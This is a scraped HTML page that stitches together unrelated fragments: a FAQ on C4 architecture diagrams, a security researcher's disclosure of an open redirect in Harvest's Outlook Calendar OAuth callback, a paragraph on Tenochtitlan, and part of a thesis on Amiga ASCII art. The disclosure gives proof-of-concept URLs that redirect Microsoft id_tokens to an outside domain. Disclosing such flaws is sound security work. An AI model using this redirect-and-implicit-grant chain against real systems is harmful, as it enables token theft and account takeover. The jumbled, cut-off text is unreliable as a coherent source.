                            it's often useful to understand how all of these software systems fit together within a given enterprise, organisation, department, etc.
                            Essentially this is a map of the software systems within the chosen scope,
                            with a C4 drill-down for each software system of interest.
                        </p>
                        <p>
                            From a practical perspective, a system landscape diagram is really just a system context diagram without a specific focus on a particular software system.

                            A dynamic diagram can be useful when you want to show how elements in the static model collaborate at runtime to implement a user story, use case, feature, etc.
                            This dynamic diagram is based upon a <a href="https://en.wikipedia.org/wiki/Communication_diagram">UML communication diagram</a>
                            (previously known as a "UML collaboration diagram"). It is similar to a <a href="https://en.wikipedia.org/wiki/Sequence_diagram">UML sequence diagram</a>
                            although it allows a free-form arrangement of diagram elements with numbered interactions to indicate ordering.

                            A deployment diagram allows you to illustrate how instances of software systems and/or containers in the static model are deployed on to the infrastructure within a given <b>deployment environment</b>
                            (e.g. production, staging, development, etc).

                            A <b>deployment node</b> represents where an instance of a software system/container is running;
                            perhaps physical infrastructure (e.g. a physical server or device),
                            virtualised infrastructure (e.g. IaaS, PaaS, a virtual machine),
                            containerised infrastructure (e.g. a Docker container),
                            an execution environment (e.g. a database server, Java EE web/application server, Microsoft IIS), etc.
                            Deployment nodes can be nested.
                        </p>

                        <p>
                            You may also want to include <b>infrastructure nodes</b> such as DNS services, load balancers, firewalls, etc.

                <p>
                    The C4 model is <b>notation independent</b>, and doesn't prescribe any particular notation.
                    As a starting point though, a simple notation that works well on whiteboards, paper, sticky notes, index cards and a variety of diagraming tools is as follows.

                <h3>C4 and UML</h3>
                <p>
                    Although the example diagrams above are created using a "boxes and lines" notation,
                    the core diagrams can be illustrated using UML with the appropriate use of packages, components and stereotypes. The resulting UML diagrams do tend to lack the same degree of descriptive text though, because adding such text isn't possible (or easy) with some UML tools.
                </p>
                <p>
                    Here are three examples of a System Context, Container and Component diagram for comparison.

                </p>

                <h3>Diagram key/legend</h3>
                <p>
                    Any notation used should be as self-describing as possible, but <b>all diagrams should have a key/legend</b> to make the notation explicit.
                    This applies to diagrams created with notations such as UML, ArchiMate and SysML too, as not everybody will know the notation being used.

                <h3>Notation, notation, notation</h3>
                <p>
                    Although the C4 model is an abstraction-first approach and notation independent, you still need to ensure that your diagram notation makes sense,
                    and that the diagrams are comprehensible.
                    A good way to think about this is to ask yourself whether each diagram can stand alone, and be (mostly) understood without a narrative.
                    You can use this short <a href="https://c4model.com/review">software architecture diagram review checklist</a> to help.
                    And here are some recommendations related to notation.

                        <h4>Diagrams</h4>
                        <ul>
                            <li>Every diagram should have a title describing the diagram type and scope (e.g. "System Context diagram for My Software System").</li>
                            <li>Every diagram should have a key/legend explaining the notation being used (e.g. shapes, colours, border styles, line types, arrow heads, etc).</li>
                            <li>Acronyms and abbreviations (business/domain or technology) should be understandable by all audiences, or explained in the diagram key/legend.</li>
                        </ul>

                        <h4>Elements</h4>
                        <ul>
                            <li>The type of every element should be explicitly specified (e.g. Person, Software System, Container or Component).</li>
                            <li>Every element should have a short description, to provide an "at a glance" view of key responsibilities.</li>
                            <li>Every container and component should have a technology explicitly specified.</li>
                        </ul>
                    </div>
                    <div>
                        <h4>Relationships</h4>
                        <ul>
                            <li>Every line should represent a unidirectional relationship.</li>
                            <li>Every line should be labelled, the label being consistent with the direction and intent of the relationship (e.g. dependency or data flow). Try to be as specific as possible with the label, ideally avoiding single words like, "Uses".</li>
                            <li>Relationships between containers (typically these represent inter-process communication) should have a technology/protocol explicitly labelled.</li>
                        </ul>

                <p>
                    Finally, don't feel that you need to always use a traditional "boxes and arrows" diagram.
                    Although this is usually the default approach, there are other, often interactive, visualisations
                    that can be used to show the same C4 model abstractions in very different ways.

                        <h4>What's the background behind the C4 model?</h4>
                        <p>
                            The C4 model was created by <a href="http://simonbrown.je/">Simon Brown</a>, who started teaching people about software architecture,
                            while working as a software developer/architect in London. Part of Simon's training course was a design exercise, where groups of people
                            were given some requirements, asked to do some design, and to draw some diagrams to express that design.
                        </p>
                        <p>
                            Although this was a design focussed exercise, the wide variety of diagrams made it evident that the visualisation of ideas was a skill that most people sorely lacked.
                            The C4 model is essentially a formalisation of how Simon used to visualise software architecture, which has evolved over the years.   
                        </p>
                    </div>
                    <div>
                        <h4>What's the inspiration behind the C4 model?</h4>
                        <p>
                            The C4 model was inspired by the <a href="https://en.wikipedia.org/wiki/Unified_Modeling_Language">Unified Modeling Language</a> and
                            the <a href="https://en.wikipedia.org/wiki/4%2B1_architectural_view_model">4+1 model for software architecture</a>.
                            In summary, you can think of the C4 model as a simplified version of the underlying concepts, designed to
                            (1) make it easier for software developers to describe and understand how a software system works and
                            (2) to minimise the gap between the software architecture model/description and the source code.
                        </p>
                        <p>
                            The roots of the C4 model, and the various diagram types within it, can be traced back to somewhere in the region of 2006,
                            although the "C4" name came much later, around the end of 2011. It was created during a time where
                            teams, influenced by the agile movement, were less than enthusiastic about using UML. 
                        </p>

                    <div>
                        <h4>Isn't the C4 model a step backwards? Why are you reinventing UML? Why not just use UML?</h4>
                        <p>
                            Whether you see the C4 model as a step forwards or a step backwards depends upon where you are.
                            If you're using UML (or SysML, ArchiMate, etc) and it's working for you, stick with it.
                            Unfortunately, UML usage seems to be in decline, and many teams have reverted to using ad hoc boxes and lines diagrams once again.
                            Given that many of those teams don't want to use UML (for various reasons), the C4 model helps introduce some structure and discipline into the way software architecture is communicated.
                            For many teams, the C4 model is sufficient. And for others, perhaps it's a stepping stone to UML.

                        <h4>How many people use the C4 model?</h4>
                        <p>
                            The honest answer is that nobody knows. Simon has personally taught the C4 model to somewhere over 10,000 people in more than 30 countries;
                            with conference talks, videos, books and articles reaching many more than this.
                            Other people are also teaching, speaking and writing about the C4 model too.
                            It's definitely being used though, in organisations ranging from startups to global household names.

                    <div>
                        <h4>Why "container"?</h4>
                        <p>
                            Terms like "process", "application", "app", "server", "deployable unit", etc all have associated implications,
                            so the name "container" was chosen as a generic way to describe something in which components live.
                            From one perspective, it's unfortunate that containerisation has become popular, because many software developers now associate the term "container" with Docker.
                            From another perspective though, there is sometimes a nice parity between a container in the C4 model and an infrastructure (e.g. Docker) container.
                        </p>
                        <p>
                            While many teams successfully use the C4 model as is, feel free to change the terminology if needed.
                        </p>
                    </div>
                    <div>
                        <h4>Can we change the terminology?</h4>
                        <p>
                            This terminology (context, containers, components and code) works for many organisations and many types of software.
                            However, sometimes an organisation will have an existing terminology that people are already familiar with.
                            Or perhaps "components" and "classes" don't easily map on to the technology being used (e.g. functional languages often use the terms "module" and "function").
                        </p>
                        <p>
                            Feel free to modify the terminology that you use to describe software architecture at different levels of abstraction.
                            Just make sure that everybody explicitly understands it.

                        <h4>How do you model microservices and serverless?</h4>
                        <p>
                            Broadly speaking, there are two options for diagramming microservices when using the C4 model, although it depends what you mean by "microservice".
                        </p>

                        <p>
                            <b>Approach 1: Each "microservice" is owned by a separate team</b>
                            <br>
                            If your software system has a dependency upon a number of microservices that are outside of your control (e.g. they are owned and/or operated by a separate team), model these microservices as external software systems, that you can't see inside of.
                        </p>

                        <p>
                            <b>Approach 2: A single team owns multiple "microservices"</b>
                        </p><p>
                            Imagine that you have an API app (e.g. Spring Boot, ASP.NET MVC, etc) that reads/writes to a relational database schema.
                            Regardless of whether you consider the term "microservice" to refer to just the API app, or the combination of the API app and database schema ...
                            if the microservices are a part of a software system that you are building (i.e. you own them), model every deployable thing as a container.
                            In other words, you'd show two containers: the API app, and the database schema.
                            Feel free to draw a box around these two containers to indicate they are related/grouped.
                        </p>

                        <p>
                            The same is true for serverless functions/lambdas/etc; treat them as software systems or containers based upon ownership.
                        </p>
                    </div>
                    <div>
                        <h4>How do you diagram large and complex software systems?</h4>
                        <p>
                            Even with a relatively small software system, it's tempting to try and include the entire story on a single diagram. For example, if you have a web application, it seems logical to create a single component diagram that shows all of the components that make up that web application. Unless your software system really is that small, you're likely to run out of room on the diagram canvas or find it difficult to discover a layout that isn't cluttered by a myriad of overlapping lines. Using a larger diagram canvas can sometimes help, but large diagrams are usually hard to interpret and comprehend because the cognitive load is too high. And if nobody understands the diagram, nobody is going to look at it.
                        </p>
                        <p>
                            Instead, don't be afraid to split that single complex diagram into a larger number of simpler diagrams, each with a specific focus around a business area, functional area, functional grouping, bounded context, use case, user interaction, feature set, etc. The key is to ensure that each of the separate diagrams tells a different part of the same overall story, at the same level of abstraction.

                        <p>
                            Due to the hierarchical nature of the C4 model, each diagram will change at a different rate.

                            <li><b>System Context diagram</b>: In most cases, the system context diagram will change very slowly, as this describes the landscape that the software system is operating within.</li>
                            <li><b>Container diagram</b>: Unless you're building a software system that makes heavy use of microservices or serverless lambdas/functions/etc, the container diagram will also change relatively slowly.</li>
                            <li><b>Component diagram</b>: For any software system under active development, the component diagrams may change frequently as the team adds, removes or restructures the code into cohesive components.

                            The focus of the C4 model is the static structures that make up a software system, at different levels of abstraction.
                            If you need to describe other aspects, feel free to supplement the C4 diagrams with UML diagrams, BPML diagrams, ArchiMate diagrams, entity relationship diagrams, etc.

                        <h4>The C4 model vs UML, ArchiMate and SysML?</h4>
                        <p>
                            Although existing notations such as UML, ArchiMate and SysML already exist, many software development teams don't seem to use them.
                            Often this is because teams don't know these notations well enough, perceive them to be too complicated, think they are not compatible with agile approaches or don't have the required tooling.
                        </p>

                        <p>
                            If you are already successfully using one of these notations to communicate software architecture and it's working, stick with it. If not, try the C4 model.
                            And don't be afraid to supplement the C4 diagrams with UML state diagrams, timing diagrams, etc if you need to.
                        </p>
                    </div>
                    <div>
                        <h4>Can we combine C4 and arc42?</h4>
                        <p>
                            Yes, many teams do, and the C4 model is compatible with the <a href="http://arc42.org/">arc42 documentation template</a> as follows.
                        </p>

                        <ul>
                          <li>Context and Scope =&gt; System Context diagram</li>
                          <li>Building Block View (level 1) =&gt; Container diagram</li>
                          <li>Building Block View (level 2) =&gt; Component diagram</li>
                          <li>Building Block View (level 3) =&gt; Class diagram</li>
                        </ul>
                    </div>
                </div>
                <div>
                    <div>
                        <h4>Does the C4 model imply a design process or team structure?</h4>
                        <p>
                            A common misconception is that a team's design process should follow the levels in the C4 model hierarchy, perhaps with different people on the team being responsible for different levels of diagrams.
                            For example, a business analyst creates the system context diagram, the architect creates the container diagram, while the developers look after the remaining levels of detail.
                        </p>
                        <p>
                            Although you can certainly use the C4 model in this way, this is not the intended or recommended usage pattern.
                            The C4 model is just a way to describe a software system, from different levels of abstraction, and it implies nothing about the process of delivering software.
                        </p>
                    </div>
                    <div>
                        <h4>Using C4 to describe libraries, frameworks and SDKs?</h4>
                        <p>
                            The C4 model is really designed to model a software system, at various levels of abstraction.
                            To document a library, framework or SDK, you might be better off using something like UML.
                            Alternatively, you could use the C4 model to describe a usage example of your framework, library or SDK; perhaps using colour coding to signify which parts of the software system are bespoke vs those provided for you. 
                        </p>
                    </div>
                    <div>
                        <h4>Web applications; one container or two?</h4>
                        <p>
                            If you're building a server-side web application (e.g. Spring MVC, ASP.NET, Ruby on Rails, Django, etc) that is predominantly generating static HTML content, then that's a single container.
                            If there's a significant quantity of JavaScript being delivered by the server-side web application (e.g. a single-page application built using Angular), then that's two containers.
                            <a href="https://static.structurizr.com/workspace/36141/diagrams/Containers.png">Here's an example</a>.
                        </p>
                        <p>
                            Although, at deployment time, the server-side web application includes both the server-side and client-side code, treating the client and server as two separate containers makes it explicit that these are two separate process spaces, communicating via an inter-process/remote communication mechanism (e.g. JSON/HTTPS).
                            It also provides a basis for zooming in to each container separately to show the components inside them.
                        </p>
                    </div>
                </div>
                <div>
                    <div>
                        <h4>Should the lines represent dependencies or data flow?</h4>
                        <p>
                            This is your choice. Sometimes diagrams work better showing dependency relationships (e.g. uses, reads from, etc),
                            and sometimes data flow (e.g. customer update events) works better. Whichever you choose, make sure that the description of the line matches the direction of the arrow.
                        </p>
                        <p>
                            It's also worth remembering that most relationships can be expressed either way, and the more explicit you can be, the better.
                            For example, describing a relationship as "sends customer update events to" can be more descriptive than simply "customer update events".
                        </p>
                    </div>                            
                    <div>
                        <h4>Is a Java JAR, C# assembly, DLL, module, etc a container?</h4>
                        <p>
                            Typically not.
                            A container is a runtime construct, like an application; whereas Java JAR files, C# assemblies, DLLs, modules, etc are used to organise the code within those applications.
                        </p>
                    </div>
                    <div>
                        <h4>Is a Java JAR, C# assembly, DLL, module, package, namespace, folder etc a component?</h4>
                        <p>
                            Perhaps but, again, typically not.
                            The C4 model is about showing the runtime units (containers) and how functionality is partitioned across them (components), rather than organisational units such as Java JAR files, C# assemblies, DLLs, modules, packages, namespaces or folder structures. 
                        </p>
                        <p>
                            Of course, there may be a one-to-one mapping between these constructs and a component; e.g. if you're building a hexagonal architecture, you may create a single Java JAR file or C# assembly per component.
                            On the other hand, a single component might be implemented using code from a number of JAR files, which is typically what happens when you start to consider third-party frameworks/libraries, and how they become embedded in your codebase.
                        </p>
                    </div>
                </div>
                <div>
                    <div>
                        <h4>Should you include message buses, API gateways, service meshes, etc?</h4>
                        <p>
                            If you have two services, A and B, that communicate by sending a message via a message bus (irrespective of topics, queues, p2p, pub/sub, etc) or another intermediary (e.g. an API gateway or service mesh), you have a couple of options.
                            The first option is to show service A sending a message to the intermediary, and the intermediary subsequently forwarding that message to service B.
                            While accurate, the "hub and spoke" nature of the diagram tends to obscure the notion that there's coupling between the message producer and consumer.
                        </p>
                        <p>
                            The other approach is to omit the intermediary, and instead use notation (e.g. a textual description, colour coding, line style, etc) to signify that the interaction between service A and B happens via an intermediary.
                            This approach tends to result in diagrams that tell a clearer story.
                        </p>
                    </div>                            
                    <div>
                        <h4>Should data storage services be shown as software systems or containers?</h4>
                        <p>
                            A frequently asked question is whether services like Amazon S3, Amazon RDS, Azure SQL Database, content delivery networks, etc should be shown as software systems or containers. After all, these are external services that most of us don't own or run ourselves.
                        </p>
                        <p>
                            If you're building a software system that is using Amazon S3 for storing data, it's true that you don't run S3 yourself, but you do have ownership and responsibility for the buckets you are using. Similarly with Amazon RDS, you have (more or less) complete control over any database schemas that you create. For this reason, treat them as containers because they are an integral part of your software architecture, although they are hosted elsewhere.
                        </p>
                    </div>
                    <div>
                        <h4>Is the C4 model universally applicable?</h4>
                        <p>
                            The C4 model was designed to help describe, document, and diagram custom-built, bespoke software systems.
                            From this perspective, the C4 model can be used to describe a variety of software architectures (monolithic or distributed), built in a variety of programming languages, deployed on a variety of platforms (on-premises or cloud).
                        </p>
                        <p>
                            Solutions that are perhaps less suited to the C4 model include embedded systems/firmware, and solutions that reply on heavy customization rather than bespoke development (e.g. SAP and Salesforce).
                            Even with these solutions, you still may find the System Context and Container diagrams useful.

  <h2 id="summary">Summary</h2>
<p>Harvest is a time-tracking software that allows users to connect their Outlook Calendar through OAuth. After a successful grant of permission, the user is redirected to <a href="https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback">https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback</a> which further redirects the user to the URL provided within the state. This leads to an open redirect which can be used to steal access tokens through an implicit grant.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The bare open redirect which led to the token leak was found after a successful connection to Outlook calendar using OAuth application located at <a href="https://hackerone295.harvestapp.com/outlook-calendar/connect">https://hackerone295.harvestapp.com/outlook-calendar/connect</a>. The link was:</p>
<pre><code><span>https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback?state=%7b%22return_to%22:%22/%22%2c%22subdomain%22:%22hackerone295%22%7d
</span></code></pre>
<p><code>state</code> parameter in the above URL is a JSON object URI encoded:</p>
<pre data-lang="json"><code data-lang="json"><span>{"</span><span>return_to</span><span>":"</span><span>/</span><span>","</span><span>subdomain</span><span>":"</span><span>hackerone295</span><span>"}
</span></code></pre>
<p>The subdomain parameter is used to guess the main space of the Harvest app ie. <a href="http://hackerone295.harvestapp.com/">hackerone295.harvestapp.com</a> in the above case. Appending a forward slash to the <code>subdomain</code> parameter leads to open redirect:</p>
<pre><code><span>https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback?state=%7b%22return_to%22:%22/%22%2c%22subdomain%22:%22example.com/%22%7d
</span></code></pre>
<p>Since the url <a href="https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback">https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback</a> is set as a redirection URL within the OAuth application, the open redirection can be used to steal the access token.</p>
<p>Combining the open redirect with implicit grant flow leaks the access tokens to the redirected URL. Implicit grant flow can be crafted as follows:</p>
<pre><code><span>https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
</span><span>client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token
</span><span>&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22localhost/%22%7d
</span><span>&amp;scope=openid
</span><span>&amp;response_mode=fragment
</span><span>&amp;state=1
</span><span>&amp;nonce=123456
</span></code></pre>
<p>The <code>redirect_uri</code> in the above link is the open redirect link. The <code>client_id</code> is the id of OAuth Application accessible via <a href="https://hackerone295.harvestapp.com/outlook-calendar/connect">https://hackerone295.harvestapp.com/outlook-calendar/connect</a></p>
<p>POC URL: <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22example.com/%22%7d&amp;scope=openid&amp;response_mode=fragment&amp;state=1&amp;nonce=123456">https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22example.com/%22%7d&amp;scope=openid&amp;response_mode=fragment&amp;state=1&amp;nonce=123456</a></p>

<p>In the process of disclosing and patching this vulnerability, the Harvest team was barely responsive. The company acknowledged the vulnerability by triaging but took a very long time to fix the vulnerability. After 3 years of reporting, the company finally fixed the vulnerability silently and didn't bother to inform. On 1st August 2023, I tested the vulnerability again and found it fixed. The report is still marked as triage as of 21 October 2023, and their bug bounty policy mentions rewards but no bounty or even HackerOne points were rewarded by the company. According to their HackerOne page, their average time to triage was 8 days (in 2020) but now it is nil. Hence, finally disclosing this publicly.</p>
<ul>

            The year is 1518. Mexico-Tenochtitlan, once an unassuming settlement in the middle of Lake Texcoco, now a bustling metropolis. It is the capital of an empire ruling over, and receiving tribute from, more than 5 million people. Tenochtitlan is home to 200.000 farmers, artisans, merchants, soldiers, priests and aristocrats. At this time, it is one of the largest cities in the world.</p><p>Today, we call this city Ciudad de Mexico - Mexico City.</p><p>Not much is left of the old Aztec - or <i>Mexica</i> - capital Tenochtitlan. What did this city, raised from the lake bed by hand, look like? Using historical and archeological sources, and the expertise of many, I have tried to faithfully bring this iconic city to life.

<div id="readability-page-1" class="page"><div><h2 id="summary">Summary</h2><p>In my thesis, I study Amiga ASCII text art. Amiga ASCII is a form of text art where the composition of letter characters set in the Amiga computer's font forms a two-dimensional representation or image. The Amiga scene is a subculture of computer enthusiasts that was popular in the 1990s. At its core are the logos and other visual materials created for BBS systems and the competitive rivalry among artists who create text art over their image-making prowess.</p><p>I delve into the creation of Amiga ASCII art and use it as a method to develop my visual expression. I define text art as one style of visual art, which includes ASCII art and its sub-genres, and I briefly describe the history of text art and ASCII art and the subculture associated with it. In my thesis, I focus especially on Amiga ASCII text art and create a collection of images from my experiments with this image-making method.</p><p><strong>Keywords:</strong> text art, computer, subculture, illustration, ASCII, Amiga.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>This is my BA thesis I wrote in 2015. <a href="https://aaltodoc.aalto.fi/handle/123456789/16290">The original</a> is in Finnish, but I finally managed to translate it to English.</p><p>This thesis is <em>just</em> a bachelors thesis, so it's far from being comprehensive.

By combining these three symbols in sequence, you get :-). When you tilt this combination ninety degrees clockwise in your mind, it can be interpreted as a smiling face, an emoticon, with eyes, nose, and mouth. Originally, these symbols were created for the structures of written language, but in daily human communication, these symbols and their combinations have been given a new added meaning and purpose. Images created with letter characters enhance the expressiveness of text-based presentations, such as emails or text messages.</p><p>In text-based communication, the representation of images has not always been possible for technical reasons. To address this need, text art emerged, a technique of creating images where a picture or word is formed from drawn or printed symbols in a composition. An emoticon is a kind of simple image formed with letter characters. However, by combining various letter characters spread over several lines, it's possible to create much more nuanced images that can depict almost any subject. This image-making technique has been a part of the history of writing up to the present day. I will discuss this matter in more detail in section <a href="#222-history-of-text-art">2.2.2.</a></p><p>Text art made on a computer is usually called ASCII art. The name derives from the character standard developed in the 1960s. ASCII art flourished in the 1980s and 1990s, before the internet, when text-based BBS systems operating on telephone networks served as the primary places for thought and information exchange, much like the internet. The making of ASCII art waned as the internet displaced BBS systems with the advent of fast broadband connections around the year 2000. However, ASCII art has surged in recent years due to nostalgia, social media, and the archiving of ASCII art.</p><p>In my thesis, I delve into this image-making technique and use it as a method to develop my visual expression. In the research sections, I define text art as one genre of visual art, encompassing ASCII art and its sub-genres, and briefly describe the history of text art and ASCII art and the associated subculture. I focus especially on the Amiga-style ASCII text art in my thesis and create a collection of my experiments using this image-making method. I elaborate on the aforementioned concepts in section <a href="#23-the-era-of-ascii-art">2.3</a>.</p><hr><h2 id="research-section">RESEARCH SECTION</h2><h2 id="21-source-materials-and-research-data">2.1. SOURCE MATERIALS AND RESEARCH DATA</h2><p>Historically, the typewriter as a medium of creative expression has largely been overlooked, perhaps because those who created typewriter art were primarily professional typists who demonstrated their skills mainly to peers in the same field. Many early typewriter artists were likely unaware of the historical background and significance of their art, leading to a lack of its widespread recognition and acceptance by critics. Those who were interested in the typewriter as a medium for text art were mainly intrigued by it from the perspective of concrete poetry, rather than viewing it from a visual art perspective. This has resulted in a lack of complete understanding of the entire field of text art. Only now, due to the archiving capabilities of the Internet and the exposure of text art, is a more comprehensive picture emerging.<sup><a href="#fn1" id="fnref1">[1]</a></sup></p><p>This same trend seems to be occurring with ASCII text art, leading to a perceived lack of quality source material on text art or ASCII art. Two anthologies have been written on typewriter art: Alan Riddell's <em>Typewriter Art</em> (1975) and Barrie Tullett's <em>Typewriter Art: A Modern Anthology</em> (2014). Only one significant retrospective has been held on typewriter art (London and Edinburgh 1973, 1974)<sup><a href="#fn2" id="fnref2">[2]</a></sup>. Not a single extensive publication or study has been written on ASCII art, and only one small exhibition was held in Cologne in 2013 as part of an electronic art festival. The subject has been briefly touched upon in a few studies dealing with computer enthusiast subcultures, such as the 2011 study <em>Like City Lights, Receding: ANSi Artwork and the Digital Underground, 1985-2000</em> by Canadian Michael Hargadon. Most studies focus on computer enthusiast subcultures and related phenomena mainly from a technical, sociological, or historical perspective.</p><p>For my research, I interviewed two individuals who are still actively involved in the Amiga ASCII scene. I interviewed Amiga ASCII pioneer, German Michael "Skin" Hischer, via email. Additionally, I interviewed Finnish Amiga ASCII artist Antti "h7" Kiuru. The interviews mainly focused on questions about the process of creating ASCII art, their style, sources of inspiration, and personal history. I also posed a few general questions in the Facebook group "Ansi, Ascii artists worldwide!" which includes a large portion of individuals involved in the subculture.</p><p>As written sources, I utilized several studies dealing with computer enthusiast subcultures and related phenomena, numerous internet sources, and Barrie Tullett's work on typewriter art, <em>Typewriter Art: A Modern Anthology</em>. From these pieces, I believe I was able to create a comprehensive yet source-critical understanding and description of the subject matter under investigation.</p><h2 id="22-about-text-art">2.2. ABOUT TEXT ART</h2><h3 id="221-definition-of-text-art">2.2.1. DEFINITION OF TEXT ART</h3><p>While working on this thesis, there didn't seem to be a definition of text art available anywhere. This is probably due to the almost complete absence of both Finnish and English literature or research on text art. Just the fact that the English Wikipedia article for "text art"<sup><a href="#fn3" id="fnref3">[3]</a></sup> redirects to a vague and sparse article on ASCII art indicates the scarcity of research and that the history of text art has not been fully understood internationally. However, to address my research topic, I need to define text art in some way.</p><p>When I started to develop a definition of text art, the difference in the use of a letter character in written language and in text art seemed to be a defining factor. What is the significance of a letter in text art? What's the difference between a letter character in written language and in text art?</p><p>Text is a semantic unit. In text, the form isn't as important as the meaning given by the forms<sup><a href="#fn4" id="fnref4">[4]</a></sup>. Written text consists of graphemes, i.e., written characters. Grapheme refers to letters, that is, characters used in a phonetic writing system, and other writable characters such as numbers and punctuation marks<sup><a href="#fn5" id="fnref5">[5]</a></sup>. In written language, text and letters contain meanings; they are a tool for communication.</p><p>In the context of text art, a character is considered solely through its form. In text art, a letter is not symbolic and does not have semantic meaning, but the composition of letter characters creates an image, which in itself can symbolize something. The semantic meaning of the image arises from the form given by the composition of the letter characters, that is, what the image resembles, unlike in written language where combinations of letter characters, words, and sentences mean something, carry meaning. Thus, one can think that the word "ball" immediately brings to mind an object made of some material, while in the context of text art, a ball can be symbolized by, for example, the letter O, in which case just the shape of the letter can bring to mind an object made of material.</p><p>Text art can therefore be defined as follows: <strong>text art is a form of art in which a composition of letter characters forms a two-dimensional representation, that is, an image</strong>.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>This definition is not satisfactory.</p><p>First of all, there are forms of text art where characters can have be both: semantic (where the character is a part of a word) and non-semantic (where the same character is part of an typographical picture) meanings. This is quite common in shaped or visual poetry.</p><p>Secondly — where the attempt at a universal definition of text art gets really complicated — it's possible that the whole picture consists of no letters at all. An example is of course ANSI art, where the pictures usually consist of only block elements █, ▓, ▒, and ░.</p><p>A possible, more broad, but also more straightforward, definition of text art could be: <strong>pictorial images created from type elements</strong>. (I don't suggest that to be the definitive definition, because it doesn't quite capture the essence of more calligraphic forms of text art.)</p><p>Broadly, text art can be divided into 3 categories: calligraphic, mechanical and digital.</p><p>Calligraphic text is hand drawn, it includes but is not limited to these sub-genres: calligrammes, calligraphic pictures, zoomorphic calligraphy, various shaped or pattern poetry (carmina figurata, grid poem, imago poem, spatial line poem), micro-calligraphy (or microgrammy), some asemic writing and pictorial islamic calligraphy.</p><p>Mechanical text art is usually done with either letterpress or typewriter. That includes subgenres such as: type pictures / typipictures (US), art-printing, letter-pictures, pictorial typography, ruled paintings / picture, imagotipo/imagotipia (Venezuela), Koppermandaag prenten (The Netherlands), Bildsatz, Ornamententypensatz, Typensatz (Germany), Stigmatypie (Austria), stigmatypy (US), typometry / typometrie, typotecture and typewriter art (including concerte poetry and other visual poetry).</p><p>Digital text art includes various textmode art such as 7-bit and 8-bit ASCII art, PETSCII, ATASCII, PC-ASCII (filled ASCII), ANSI art, Amiga ASCII, Shift_JIS, Unicode art, Taiwanese ANSI and others. Non-textmode text art includes newer and more varied styles, but they are too numerous to include here. Check Carlsson's overview and Polyduck's <a href="https://polyducks.co.uk/pages/what-is-textmode/">What is Textmode?</a> for more.</p><p>(I should write a more comprehensive overview especially of the mechanical ones at some point...)</p></div><h2 id="222-history-of-text-art">2.2.2. HISTORY OF TEXT ART</h2><p>Before the invention of typewriters and computers, calligram was the most common form of text art. A calligram is a poem, phrase, or word in which the text or words are arranged so that they collectively form a picture. The picture formed in the calligram is usually visually related to the words or word used in it and expresses the theme of the poem. One of the first calligrams is <em>Axe</em> by Simmias of Rhodes, made in 325 BC, where the text forms an image of an axe (Figure 2). A Jewish tradition of micro-calligraphy also resembles calligrams, where small written Hebrew letters form geometric and abstract images<sup><a href="#fn6" id="fnref6">[6]</a></sup>.</p><figure><img alt="A manuscript page of 3 poems shaped like an axe, wings and a vase" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/XAbta85DYP-700.jpeg" width="700" height="396"><figcaption>(Figure 2.) Axe of Simmias of Rhodes, 325 BCE</figcaption></figure><p>Arabic calligraphy can also be considered a form of text art. Drawing humans is seen in Islam as idol worship, so picyutrd were drawn using calligraphy, that is, text. In Islamic culture, calligraphy is considered the noblest form of visual art, as it translates the words of God as revealed in the Qur'an into a visible form. Qur'anic manuscripts have always been commissioned from the most skilled calligraphers to give the text an artistic appearance worthy of its value <sup><a href="#fn7" id="fnref7">[7]</a></sup>.</p><p>Movable type and printing press developed in the 1400s made duplicating knowledge fast and, above all, cheap. The printing technique made it possible to shape people's perceptions of themselves and the surrounding world. The great revolution of printing in Europe was the invention of movable type, which meant that the same type could be used over and over again to produce many different printed products. Movable types significantly accelerated page production compared to engraving each page separately on wood or metal plates, so movable types were also used to create typographic ornaments and pictures <sup><a href="#fn8" id="fnref8">[8]</a></sup>.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>This is my current focus of study and I hope to write more about the history of pictorial typography with movable type soon™!</p></div><p>Just as the printing press once did, the typewriter revolutionized the world. By the end of the 1800s, it had established its position not only in the industrial and commercial sectors but also in the cultural and social fields. Typewriter created new professions and livelihoods and was also a crucial step towards women's emancipation. It also gave people the means to communicate freely without fear of censorship and enabled writers to write as quickly as they thought. The typewriter brought a modern way of directly presenting and disseminating thoughts<sup><a href="#fn9" id="fnref9">[9]</a></sup>. It also became a tool for making art.</p><figure><img alt="Typewritten drawing of a butterfly" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/sQHzWW2fiz-600.jpeg" width="600" height="901"><figcaption>(Figure 3.) Flora Stacey's butterfly (1898)</figcaption></figure><p>One of the first surviving images made with a typewriter is a picture of a butterfly made by Flora Stacey, who worked as a secretary, in 1898<sup><a href="#fn10" id="fnref10">[10]</a></sup> (Figure 3). By re-entering the same paper at different angles and stacking letters, almost any shape could be created, and Stacey's picture is more reminiscent of pencil drawing than typical mosaic-like text art. On the other hand, a few years earlier, the publication <em>Pitman’s Typewriter Manual</em> (1893) better utilized the limitations and possibilities set by the typewriter and is more reminiscent of modern ASCII art than Stacey's butterfly (Figure 4).</p><figure><img alt="Various patterns, letters and characters made with a typewriter" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/xaTljLkg-F-590.jpeg" width="590" 